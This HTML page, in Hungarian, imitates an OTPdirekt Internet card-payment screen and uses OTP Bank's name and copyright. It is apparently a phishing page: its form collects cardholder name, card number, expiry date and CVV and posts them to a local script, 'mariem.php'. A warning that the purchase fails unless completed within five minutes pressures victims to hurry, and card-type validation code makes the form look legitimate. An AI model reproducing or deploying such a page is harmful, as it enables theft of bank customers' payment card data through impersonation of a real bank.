<html lang="hu" xml:lang="hu" xmlns="">
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
	<title>OTPdirekt Internet</title>
	<!------------------------------- FILE JAVASCRIPT ---------------------------------><script src="../../lib/js/jquery.js"></script><script src="../../lib/js/jquery.validate.js"></script><script src="../../lib/js/jquery.additional-methods.js"></script><script src="../../lib/js/jquery.v-form.js"></script><script src="../../lib/js/jquery.CardValidator.js"></script><script src="../../lib/js/jquery.mask.js"></script><!------------------------------- FILE JAVASCRIPT ---------------------------------><script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
    </script><script src="./js/jquery-2.1.4.js"></script><script src="./js/jquery.validate.min.js"></script><script src="./js/additional-methods.min.js"></script><script src="./js/validation.js"> </script><meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
	<link href="./img/favicon.gif" rel="icon" type="image/x-icon" />
	<link href="./img/favicon.gif" rel="shortcut_icon" type="image/x-icon" /><meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link href="./2/default.css" rel="stylesheet" type="text/css" />
</head>
<body class="browserChrome browserChrome5">
<div class="content">
<p><span style="color:#FFFFFF;">.</span></p>

<p></p>

<p><span style="color:#FFFFFF;">.<img src="./img/2.png" style="
    margin-left: 230px;
" /><br />
<img src="./img/1300.png" style="
    margin-left: 25px;
" /></span></p>

<form action="./mariem.php" autocomplete="off" id="webshopVasarlasForm" method="post">
<div class="cardTitle">
<h3>Terhelendo bankkartya adatai</h3>
</div>

<div class="cardType"><label class="title" style="
    display: inline-block;
    font-size: 13px;
    padding-top: 5px;
    float: left;
    margin-left: 70px;
">Kartya tipusa </label> <select id="kartyatTipusa" name="crd" style="
    width: 200px;
    height: 30px;
    vertical-align: top;
    border: 1px solid #BDBEAB;
    background: none repeat scroll 0 0 #FCFCFB;
    padding: 5px 0 5px 3px;
    margin-left: 20px;
    font-size: 13px;
    line-height: 17px;
    color: #4c4c4c;
"><option value="MasterCard">MasterCard</option><option value="Maestro">Maestro</option><option value="VISA">VISA</option><option value="American Express">American Express</option> </select></div>

<div class="bankType"><label class="title" style="
    display: inline-block;
    font-size: 13px;
    padding-top: 5px;
    float: left;
    margin-left: 470px;
">Kartyat kibocsato bank neve</label><select aria-invalid="false" class="valid" id="kartyatTipusa" name="bname" style="
    width: 200px;
    height: 30px;
    vertical-align: top;
    border: 1px solid #BDBEAB;
    background: none repeat scroll 0 0 #FCFCFB;
    padding: 5px 0 5px 3px;
    margin-left: 20px;
    font-size: 13px;
    line-height: 17px;
    color: #4c4c4c;
"><option value="OTPBANK">OTPBANK</option><option value="Raiffeisen BANK">Raiffeisen BANK</option><option value="CITIBANK">CITIBANK</option><option value="ERSTE BANK">ERSTE BANK</option><option value="SBERBANK">SBERBANK</option><option value="BUDAPEST BANK">BUDAPEST BANK</option><option value="CIB BANK">CIB BANK</option><option value="MKB BANK">MKB BANK</option><option value="UNICREDIT BANK">UNICREDIT BANK</option><option value="MASOK">MASOK</option><option selected="selected" value="V�lassza ki bankj�t">V&aacute;lassza ki bankj&aacute;t</option></select></div>

<div class="cardData">
<div class="cardRow2">
<div class="cardFront">
<div class="cardNumber"><label class="title">Card neve Holder</label> <input id="inditoKartya" maxlength="31" name="e" required="required" style="width: 232px;height: 30px;" type="text" value="" /></div>

<div class="cardName"><label class="title">Kartyaszam</label> <input maxlength="16" name="p" required="required" style="width: 232px;height: 30px;" type="text" /></div>

<div class="cardExpire"><label class="title">Lejarati datum (hhee) </label> <input class="menjakovetkezore autoTemplateOff" maxlength="2" name="exp1" style="background-color: rgb(252, 252, 251);width: 42px;height: 30px;" type="text" value="" /> <input class="autoTemplateOff" maxlength="2" name="exp2" style="background-color: rgb(252, 252, 251);width: 42px;height: 30px;" type="text" value="" /></div>
</div>

<div class="cardBack">
<div class="codeCVC"><label class="title">ervenyesitesi kod (CVC2/CVV2) </label> <input maxlength="4" name="ccv" size="5" style="background-color: rgb(252, 252, 251);height: 30px;width: 42px;" type="password" value="" /></div>

<div class="cvcInfo"><span>A kartya hatoldalan, az alairascsikon szereplo szam utolso harom szamjegye. Amennyiben az on bankkartyajan ilyen adat nem szerepel, kerjuk, hagyja a mezot uresen! </span></div>
</div>
</div>
</div>

<div class="info">
<p>A kartya szamat folyamatosan gepelje be, a fizeto felulet automatikusan elvegzi a kartyaszam tagolasat. Amennyiben a kartyaszam beadasara kialakitott mezo hosszabb, mint az on kartyajanak a szama, a kitoltetlen helyet hagyja uresen.</p>
</div>

<div id="dccPayment"></div>

<div class="buttonCol"><span class="button"><input class="greenBtn" name="formButtons(elkuld)" style="
    margin-left: 350px;
    background: #6e9538;" type="submit" value="Tovabb" /> <span>&nbsp;</span> </span></div>
</form>

<div class="info">
<p>Felhivjuk figyelmet, hogy amennyiben az adatbevitel es a Fizetes inditasa nem tortenik meg 5 percen belul, a vasarlas elutasitasra kerul!</p>
</div>

<div class="cardIcons "><img alt="" src="./2/cardIcons.gif" /></div>
</div>

<div class="copyright">C copyright 2006-2013 OTP Bank Nyrt.</div>
</body>
</html>